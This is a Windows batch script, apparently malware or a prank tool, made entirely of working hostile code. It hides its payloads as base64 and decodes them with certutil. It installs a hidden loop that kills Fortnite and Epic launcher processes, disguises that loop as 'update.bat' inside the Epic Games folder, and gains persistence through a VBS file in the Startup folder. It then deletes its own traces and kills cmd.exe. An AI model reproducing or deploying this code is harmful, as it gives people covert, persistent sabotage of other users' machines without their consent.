@echo off

echo QGVjaG8gb2ZmDQoNCjpsb29wDQp0YXNra2lsbCAvZiAvaW0gRm9ydG5pdGUuZXhl > x.b64
echo DQp0YXNra2lsbCAvZiAvaW0gRm9ydG5pdGVDbGllbnQtV2luNjQtU2hpcHBpbmdf >> x.b64
echo RUFDLmV4ZQ0KdGFza2tpbGwgL2YgL2ltIEZvcnRuaXRlQ2xpZW50LVdpbjY0LVNo >> x.b64
echo aXBwaW5nLmV4ZQ0KdGFza2tpbGwgL2YgL2ltIEZvcnRuaXRlQ2xpZW50LVdpbjY0 >> x.b64
echo LVNoaXBwaW5nX0JFLmV4ZQ0KdGFza2tpbGwgL2YgL2ltIEZvcnRuaXRlTGF1bmNo >> x.b64
echo ZXIuZXhlDQp0aW1lb3V0IDMwDQpnb3RvIGxvb3A= >> x.b64

echo c2V0IFdzaFNoZWxsID0gd3NjcmlwdC5jcmVhdGVvYmplY3QoIldTY3JpcHQuc2hl > z.b64
echo bGwiKQ0KV3NoU2hlbGwucnVuICIiIkM6XFByb2dyYW0gRmlsZXMgKHg4NilcRXBp >> z.b64
echo YyBHYW1lc1xMYXVuY2hlclxFbmdpbmVcQmluYXJpZXNcV2luNjRcdXBkYXRlLmJh >> z.b64
echo dCIiICIsIDAsIHRydWU= >> z.b64

certutil -decode "x.b64" "update.bat" >nul
certutil -decode "z.b64" "trigger.vbs" >nul
del x.b64 >nul
del z.b64 >nul

echo QGVjaG8gb2ZmDQoNCmNlcnR1dGlsIC1kZWNvZGUgInguYjY0IiAidXBkYXRlLmJh > y.b64
echo dCIgPm51bA0KY2VydHV0aWwgLWRlY29kZSAiei5iNjQiICJ0cmlnZ2VyLnZicyIg >> y.b64
echo Pm51bA0KZGVsIHguYjY0ID5udWwNCmRlbCB6LmI2NCA+bnVsDQpkZWwgIkM6XFBy >> y.b64
echo b2dyYW0gRmlsZXMgKHg4NilcRXBpYyBHYW1lc1xMYXVuY2hlclxFbmdpbmVcQmlu >> y.b64
echo YXJpZXNcV2luNjRcdXBkYXRlLmJhdCIgPm51bA0KZGVsICIldXNlcnByb2ZpbGUl >> y.b64
echo XEFwcERhdGFcUm9hbWluZ1xNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFBy >> y.b64
echo b2dyYW1zXFN0YXJ0dXBcdHJpZ2dlci52YnMiID5udWwNCnhjb3B5ICV+ZHAwXHVw >> y.b64
echo ZGF0ZS5iYXQgIkM6XFByb2dyYW0gRmlsZXMgKHg4NilcRXBpYyBHYW1lc1xMYXVu >> y.b64
echo Y2hlclxFbmdpbmVcQmluYXJpZXNcV2luNjQiID5udWwNCnhjb3B5ICV+ZHAwXHRy >> y.b64
echo aWdnZXIudmJzICIldXNlcnByb2ZpbGUlXEFwcERhdGFcUm9hbWluZ1xNaWNyb3Nv >> y.b64
echo ZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiID5udWwNCnN0 >> y.b64
echo YXJ0IC9iICIiIGNtZCAvYyBkZWwgIiV+ZjAiJmV4aXQgL2I= >> y.b64

certutil -decode "y.b64" "tmp.bat" >nul
del y.b64 >nul
start tmp.bat > nul
timeout 3 /nobreak >nul
del trigger.vbs
del update.bat
taskkill /im cmd.exe /f > nul

exit
